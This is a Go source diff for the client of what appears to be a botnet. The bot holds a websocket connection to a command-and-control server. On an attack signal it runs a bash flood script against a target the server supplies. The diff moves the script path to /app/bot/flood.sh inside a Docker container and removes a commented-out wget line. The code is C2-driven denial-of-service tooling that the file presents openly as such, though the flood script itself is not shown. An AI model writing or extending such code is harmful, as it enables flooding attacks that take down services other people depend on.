@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"log"
 	"os/exec"
-	"path/filepath"
 	"strings"
 
 	"github.com/gorilla/websocket"
@@ -43,12 +42,12 @@ func (b *Bot) Connect() error {
 }
 
 // Handler function to execute local scripts depending on received signal from C2 layer
-func (b *Bot) Execute(fname string, args string) error {
+func (b *Bot) Execute(fpath string, args string) error {
 	var errMsg string
 
 	args = strings.TrimSpace(args)
 	if args == "" {
-		errMsg = fmt.Sprintf("[×] Failed to execute %s: No args received!\n", fname)
+		errMsg = fmt.Sprintf("[×] Failed to execute %s: No args received!", fpath)
 		b.Conn.WriteJSON(Message{
 			Payload: errMsg,
 			From:    b.Addr,
@@ -59,10 +58,9 @@ func (b *Bot) Execute(fname string, args string) error {
 
 	// TODO: Also validate valid address
 
-	cmd := exec.Command("bash", filepath.Join("../scripts", fname), args)
-	//cmd := exec.Command("wget", "-qO-", args)
+	cmd := exec.Command("bash", fpath, args)
 	if output, err := cmd.CombinedOutput(); err != nil {
-		errMsg = fmt.Sprintf("[×] Failed during exection of %s: %s\n%s", fname, err, output)
+		errMsg = fmt.Sprintf("[×] Failed during exection of %s: %s\n%s", fpath, err, output)
 		b.Conn.WriteJSON(Message{
 			Payload: errMsg,
 			From:    b.Addr,
@@ -71,7 +69,7 @@ func (b *Bot) Execute(fname string, args string) error {
 		return fmt.Errorf(errMsg)
 	}
 
-	successMsg := fmt.Sprintf("[✓] Executed %s! Args: %s", fname, args)
+	successMsg := fmt.Sprintf("[✓] Executed %s! Args: %s", fpath, args)
 	log.Printf(successMsg)
 	b.Conn.WriteJSON(Message{
 		Payload: successMsg,
@@ -100,9 +98,12 @@ func (b *Bot) Listen() error {
 
 		log.Printf("[C] Received: %s", msg.Payload)
 		if strings.HasPrefix(msg.Payload, SIGNAL_ATK) {
-			if err := b.Execute("flood_request.sh", strings.Split(msg.Payload, SIGNAL_ATK)[1]); err != nil {
+
+			// NOTE: This is the absolute path within the Docker container
+			if err := b.Execute("/app/bot/flood.sh", strings.Split(msg.Payload, SIGNAL_ATK)[1]); err != nil {
 				log.Printf(err.Error())
 			}
+
 		}
 	}
 }
